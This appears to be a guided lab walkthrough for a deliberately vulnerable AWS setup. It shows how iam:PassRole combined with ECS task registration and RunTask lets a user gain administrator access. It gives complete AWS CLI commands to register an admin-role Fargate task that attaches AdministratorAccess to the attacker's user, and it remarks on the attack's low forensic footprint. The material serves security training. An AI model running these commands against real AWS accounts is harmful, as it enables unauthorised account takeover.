# Guided Walkthrough: Privilege Escalation via iam:PassRole + ecs:RegisterTaskDefinition + ecs:RunTask

This scenario demonstrates a privilege escalation vulnerability where a user has permissions to pass IAM roles to ECS tasks (`iam:PassRole`), register ECS task definitions (`ecs:RegisterTaskDefinition`), and run ECS tasks (`ecs:RunTask`). The attacker can create a malicious ECS task definition that uses an administrative execution role, then launch it on AWS Fargate to modify IAM permissions and grant themselves administrator access.

ECS Fargate provides serverless container execution where tasks receive temporary credentials based on their task execution role. By combining `iam:PassRole` with ECS task definition registration and task execution permissions, an attacker can leverage the container platform to run arbitrary code with elevated privileges. Unlike EC2 instances, ECS Fargate tasks are ephemeral, execute quickly, and leave minimal forensic evidence beyond CloudTrail logs.

The attack works by registering a task definition that specifies an admin role and contains a containerized AWS CLI command to attach the AdministratorAccess policy to the starting user. When the task runs on Fargate, it executes with the admin role's credentials and persistently elevates the attacker's privileges. This technique is particularly stealthy because ECS tasks can complete in seconds and automatically clean up their infrastructure.

## The Challenge

You start as `pl-prod-ecs-004-to-admin-starting-user` — an IAM user whose credentials you have obtained. Your goal is to reach effective administrator access.

Your starting permissions include `iam:PassRole` on `pl-prod-ecs-004-to-admin-target-role`, along with `ecs:RegisterTaskDefinition` and `ecs:RunTask`. There is also an ECS cluster (`pl-prod-ecs-004-cluster`) already deployed and waiting. The admin role (`pl-prod-ecs-004-to-admin-target-role`) has `AdministratorAccess` and trusts `ecs-tasks.amazonaws.com` as its principal.

The key insight: you do not need direct IAM write permissions on your own user. You can make an ECS task do it for you — running as the admin role.

## Reconnaissance

First, confirm who you are and verify your permissions are in place:

```bash
aws sts get-caller-identity
```

Check what the admin target role looks like — specifically its trust policy — to confirm it trusts ECS tasks:

```bash
aws iam get-role --role-name pl-prod-ecs-004-to-admin-target-role
```

You will see `ecs-tasks.amazonaws.com` in the trust policy's `Principal` block. That means you can pass this role to an ECS task definition.

Find a subnet in your default VPC (needed for the Fargate task's network configuration):

```bash
aws ec2 describe-subnets --filters "Name=default-for-az,Values=true" --query "Subnets[0].SubnetId" --output text
```

Save that subnet ID — you will need it when launching the task.

## Exploitation

### Step 1: Register a malicious ECS task definition

Register a task definition that uses the admin role as both the task role and the execution role, and specifies an AWS CLI command to attach `AdministratorAccess` to yourself:

```bash
aws ecs register-task-definition \
  --family pl-prod-ecs-004-privesc \
  --task-role-arn arn:aws:iam::{account_id}:role/pl-prod-ecs-004-to-admin-target-role \
  --execution-role-arn arn:aws:iam::{account_id}:role/pl-prod-ecs-004-to-admin-target-role \
  --network-mode awsvpc \
  --requires-compatibilities FARGATE \
  --cpu 256 --memory 512 \
  --container-definitions '[{"name":"privesc","image":"public.ecr.aws/aws-cli/aws-cli:latest","command":["iam","attach-user-policy","--user-name","pl-prod-ecs-004-to-admin-starting-user","--policy-arn","arn:aws:iam::aws:policy/AdministratorAccess"]}]'
```

The `--task-role-arn` is what matters for the privilege escalation: the running container receives temporary credentials for that role via the ECS task metadata endpoint. Because you specified `iam:AttachUserPolicy` as the container command, the task will use those admin credentials to attach `AdministratorAccess` to your starting user the moment it starts.

### Step 2: Launch the task on Fargate

```bash
aws ecs run-task \
  --cluster pl-prod-ecs-004-cluster \
  --task-definition pl-prod-ecs-004-privesc \
  --launch-type FARGATE \
  --network-configuration "awsvpcConfiguration={subnets=[<subnet-id>],assignPublicIp=ENABLED}"
```

The task will provision, start, execute the AWS CLI command, and stop — all within a few seconds. The `AdministratorAccess` policy attachment is permanent on your IAM user even after the task exits.

### Step 3: Monitor task completion

```bash
aws ecs describe-tasks \
  --cluster pl-prod-ecs-004-cluster \
  --tasks <task-arn>
```

Wait for the task to reach `STOPPED` status with an exit code of `0` on the container.

## Verification

Confirm the policy attachment succeeded:

```bash
aws iam list-attached-user-policies --user-name pl-prod-ecs-004-to-admin-starting-user
```

You should see `AdministratorAccess` (`arn:aws:iam::aws:policy/AdministratorAccess`) in the output.

Now verify the effective admin access with your starting user credentials:

```bash
aws iam list-users
```

A successful response listing all IAM users confirms you have administrator access.

## What Happened

You exploited the combination of `iam:PassRole`, `ecs:RegisterTaskDefinition`, and `ecs:RunTask` to indirectly grant yourself admin permissions without ever directly calling an IAM write API as your starting user. The ECS task acted as a proxy — running inside a container with the admin role's credentials — and made the privileged IAM call on your behalf.

This pattern appears in real environments whenever developers are granted "ECS operator" permissions without careful scoping of `iam:PassRole`. Any user who can pass a high-privilege role to an ECS task and launch that task effectively has all permissions of that role. The attack is particularly hard to catch in real time because the task completes in seconds, the container image comes from a public registry, and the only lasting artifact is the policy attachment on your IAM user.
